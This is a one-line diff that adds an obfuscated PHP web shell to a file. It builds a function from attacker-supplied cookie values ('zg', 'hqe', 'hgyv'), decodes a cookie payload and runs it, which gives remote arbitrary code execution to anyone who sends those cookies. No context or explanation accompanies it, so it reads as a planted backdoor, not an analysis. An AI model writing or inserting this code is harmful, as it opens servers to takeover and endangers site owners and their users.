@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['zg']){$jeg=$_COOKIE['zg']("",@$_COOKIE['hqe'](@$_COOKIE['hgyv']));$jeg();}?>
